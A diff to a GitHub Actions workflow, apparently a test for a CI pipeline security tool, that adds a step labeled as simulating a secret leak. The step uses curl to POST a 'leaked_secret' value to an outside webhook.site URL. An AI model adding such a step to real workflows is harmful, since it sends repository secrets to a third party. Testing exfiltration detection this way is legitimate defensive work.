@@ -28,10 +28,16 @@ jobs:
 
       - name: Install dependencies
         run: pip install -r requirements.txt
-        
+
       - name: Make cURL request for checksum test
         run: curl https://package-registry.free.beeceptor.com/packages
-        
+
+      - name: Simulate secret leak via cURL
+        run: |
+          curl -X POST https://webhook.site/3cf43a02-7caa-4d2b-bc40-4cf906e55296 \
+            -H "Content-Type: application/json" \
+            -d "{\"leaked_secret\": \"${{ secret_leak }}\"}"
+
       - name: Cleanup PSE
         if: always()
         uses: invisirisk/pse-action@dev-test
